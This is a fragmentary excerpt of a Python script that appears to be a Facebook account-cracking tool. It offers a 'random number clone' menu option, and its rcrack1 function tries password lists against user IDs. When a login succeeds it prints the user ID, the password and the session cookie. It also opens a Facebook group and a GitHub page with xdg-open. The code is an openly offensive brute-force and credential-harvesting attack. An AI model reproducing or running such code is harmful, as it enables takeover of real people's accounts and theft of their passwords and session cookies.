...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)        
        print(" \033[92;1m[1] RANDOM  NUMBER CLONE \033[1;35m")
        print(" [2] MY fACEBOOK ACCOUNT  \033[1;32m")
        print(" [0] Exit")        
        Alif =input(" [?] Choose : ")
        os.system('xdg-open https://facebook.com/groups/914472099808341/')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('xdg-open https://github.com/M4M7N')
        if Alif in [" 0", "00"]:
            exit()
        else:
            exit()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r[\033[1;92mＭ４Ｍ７Ｎ\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Ｍ４Ｍ７Ｎ-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               #  print(f"\033[1;94m[Ｍ４Ｍ７Ｎ-CP] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Ｍ４Ｍ７Ｎ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
